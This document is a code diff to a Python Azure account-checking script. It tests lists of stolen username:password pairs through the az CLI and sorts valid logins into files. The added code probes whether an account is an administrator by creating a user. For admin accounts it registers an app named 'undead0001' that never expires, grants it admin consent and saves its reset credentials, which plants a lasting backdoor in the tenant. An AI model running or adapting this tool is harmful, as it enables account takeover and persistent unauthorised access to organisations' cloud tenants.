@@ -5,7 +5,9 @@ import subprocess
 import datetime
 import numpy as np
 import pandas as pd
-import threading
+import json
+import jmespath
+
 
 ######  acc  part
 accs = np.array(pd.read_table("./acc.txt", dtype=str, sep=':', usecols=(0, 1), encoding='utf-8', skip_blank_lines=True, header=None))
@@ -18,11 +20,22 @@ def run():
             try:
                 acc_status = get_status(acc)
                 if acc_status == '密码正确':
-                    print(acc[0] + ':' + acc[1] + ' good')
+                    # print(acc[0] + ':' + acc[1] + ' good')
                     good = acc[0] + ':' + acc[1]
                     with open('./good.txt', 'a', encoding='utf-8') as fa:
                         fa.write(good)
                         fa.write('\n')
+                    if admin_check(acc) == 'admin':
+                        admin = acc[0] + ':' + acc[1]
+                        with open('./admin.txt', 'a', encoding='utf-8') as fa:
+                            fa.write(admin)
+                            fa.write('\n')
+                        api = creat_api(acc)
+                        with open('./api.txt', 'a', encoding='utf-8') as fa:
+                            fa.write(api)
+                            fa.write('\n')
+                    else:
+                        pass
                 elif acc_status == '需要添加二验':
                     print(acc[0] + ':' + acc[1] + ' manual')
                     manual = acc[0] + ':' + acc[1]
@@ -36,6 +49,30 @@ def run():
         print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 完成运行')
     else:
         print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 运行结束')
+
+
+def admin_check(acc):
+    shell_check = 'az ad user create --display-name xxx --password SSaa1122 --user-principal-name xxx@xxx.xx --only-show-errors'
+    admin_result = subprocess.getoutput(shell_check)
+    if 'Insufficient privileges' in str(admin_result):
+        return 'not_admin'
+    elif 'domain names' in str(admin_result):
+        return 'admin'
+    else:
+        return 'error'
+
+
+def creat_api(acc):
+    shell_create = 'az ad app create --display-name undead0001 --end-date 9999-12-31 --required-resource-accesses @manifest.json --only-show-errors'
+    create_result = subprocess.getoutput(shell_create)
+
+    appid = jmespath.search('appId', json.loads(create_result))
+
+    shell_admin = 'az ad app permission admin-consent --only-show-errors --id ' + appid
+    shell_credential = 'az ad app credential reset --only-show-errors --id ' + appid
+    admin_status = subprocess.getoutput(shell_admin)
+    apis = subprocess.getoutput(shell_credential)
+    return str(apis)
 
 
 def get_status(acc):
@@ -72,7 +109,6 @@ def get_status(acc):
             return '未知错误'
 
 
-
 def test_azurecli():
     try:
         az_ver = subprocess.check_output('az -v', shell=True)
@@ -104,7 +140,5 @@ def test_azurecli():
     else:
         print('azure-cli自动安装失败，请手动安装')
 
-try:
-    threading.Thread(target=run, args=()).start()
-except Exception as error:
-    print("retry")
+
+run()
